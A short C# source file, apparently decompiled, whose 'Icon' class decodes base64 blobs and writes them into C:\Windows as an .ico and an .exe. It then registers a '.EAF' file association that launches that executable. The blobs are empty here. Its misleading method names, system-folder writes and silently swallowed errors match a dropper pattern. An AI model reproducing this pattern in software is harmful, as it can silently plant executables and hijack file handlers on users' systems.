using System;
using System.IO;
using Microsoft.Win32;

namespace Fast;

internal class Icon
{
	public static void SaveImage()
	{
		try
		{
			string s = "";
			string text = "look";
			string path = "C:\\Windows\\" + text + ".ico";
			byte[] array = Convert.FromBase64String(s);
			using (FileStream fileStream = new FileStream(path, FileMode.Create))
			{
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
			}
			CompileExe();
		}
		catch
		{
		}
	}

	private static void CompileExe()
	{
		try
		{
			string s = "";
			string text = "eaf-info";
			string path = "C:\\Windows\\" + text + ".exe";
			byte[] array = Convert.FromBase64String(s);
			using (FileStream fileStream = new FileStream(path, FileMode.Create))
			{
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
			}
			RegisterFileExt();
		}
		catch
		{
		}
	}

	private static void RegisterFileExt()
	{
		try
		{
			string text = ".EAF";
			RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey(text);
			registryKey.SetValue("", "EAF File");
			registryKey.Close();
			registryKey = Registry.ClassesRoot.CreateSubKey(text + "\\Shell\\Open\\command");
			registryKey.SetValue("", "\"C:\\Windows\\eaf-info.exe\" \"%L\"");
			registryKey.Close();
			registryKey = Registry.ClassesRoot.CreateSubKey(text + "\\DefaultIcon");
			registryKey.SetValue("", "C:\\Windows\\look.ico");
			registryKey.Close();
		}
		catch
		{
		}
	}
}
